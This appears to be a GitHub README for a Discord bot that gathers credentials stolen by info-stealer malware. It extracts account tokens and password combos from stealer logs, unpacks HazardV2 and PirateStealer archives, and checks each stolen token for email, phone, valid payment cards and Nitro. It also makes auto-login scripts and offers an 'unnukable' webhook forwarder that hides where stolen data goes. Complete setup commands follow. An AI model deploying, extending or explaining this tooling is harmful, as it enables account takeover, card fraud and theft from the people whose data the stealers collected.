# The Scraper

# STOP AND READ BEFORE YOU DO ANYTHING ELSE
## This goes directly against Discord ToS and WILL get your account termed. It's really not my problem if you decide to use this and get termed.
## Also, if you need help, make an issue and do NOT dm me on Discord.

## If you are going to skid this, at least credit me in one way or another.

## Why am I open sourcing this? I don't feel like maintaining it and I want stars.

## General features:

- Token extract from all messages
- Combo scraper (works with bby, hazard, pirate)
- Webhook forwarder (unnukable) https://github.com/kogeki/the-forwarder
- HazardV2 Zip file auto unpack
- PirateStealer Zip auto unpack
- bby cookie file auto convert

# Commands:

- /tokens : generates a list of scraped tokens, ordered newest first to oldest
- /combos : search grabbed combos. for example, `/combos netflix.com` will find all scraped Netflix combos
- /webhook : generates a private unnukable webhook that forwards to your own Discord webhook https://github.com/kogeki/the-forwarder
- /timestamp : converts a Discord ID to a timestamp
- /role_config : allows you to add role pings for special cases like billing, boosts, nitro, HQ Guilds and more
- /agree : basically a joke command.
- /authorize : authorizes the guild to use the bot
- /deauthorize : deauthorizes the guild to use the bot

# Token checker features:

- Friend count
- HQ Friends (probably broken)
- Creation date
- Email
- Phone number
- Badges
- Username + discrim
- Bio
- Billing (actually shows which cards are valid)
- HQ Guilds (finds guilds that the token has permissions in and has more than x amount of members)
- Nitro Status
- Auto login script generation
- Boost detection

All of this data is stored in the db.

# Setup:

## You will need

- Linux cloud server. For this tutorial I will be assuming you are running something debian based.
- A domain (if you want to use the forwarder)
- A discord bot account

### Step 1

SSH into the server and run the following commands:

```
sudo apt-get update
sudo apt-get install mariadb-server curl git
curl -sL https://deb.nodesource.com/setup_16.x | sudo bash -
sudo apt-get install nodejs -y
```

Now, clone the repo by doing:

```
git clone https://github.com/kogeki/the-scraper.git
cd the-scraper
```

Type `mysql` to start a MySQL interactive shell.

Then, run the following commands:

```
CREATE DATABASE grabber;
CREATE USER 'grabber'@'localhost' IDENTIFIED BY 'grabber';
GRANT ALL PRIVILEGES ON grabber.* TO 'grabber'@'localhost';
FLUSH PRIVILEGES;
```

Then, run the following commands:

```
mysql -u <USERNAME> -p <PASSWORD> grabber < setup.sql
```

Now, authorize your guild by running the following command:

```
INSERT INTO guilds (guild_id, authorized) VALUES (<YOUR GUILD ID>, 1);
```

Now, edit the config by doing:

```
nano config.json.example
```

For `token`, put your discord bot token.

For `clientId` put your discord bot client id.

For `guildId` put your discord guild id (the one you want to use the bot in).

For `owner` put your discord id.

For `webhookURL` put your discord webhook url for logs.

For `forwarder_base_url` put your domain that you want to use WITHOUT the `http://` or `https://`.

For `host` put in your MySQL host. Usually `localhost`.

For `user` put in your MySQL user. Usually `root` (not recommended).

For `port` put in your MySQL port. Usually `3306`.

For `password` put in your MySQL password.

For `database` put in your MySQL database. It is `grabber` unless you changed it.

Once you are done, save and exit, and run the following commands:

```
mv config.json.example config.json
```

Since the bot uses slash commands, you will need to invite it with this URL:

```
https://discord.com/api/oauth2/authorize?client_id=<YOUR BOT CLIENT ID>&permissions=8&scope=bot%20applications.commands
```

Then, run the following commands:

```
npm install
node deploy-commands.js
node index.js
```

Done!

# Help:

Make an issue on the github repo.
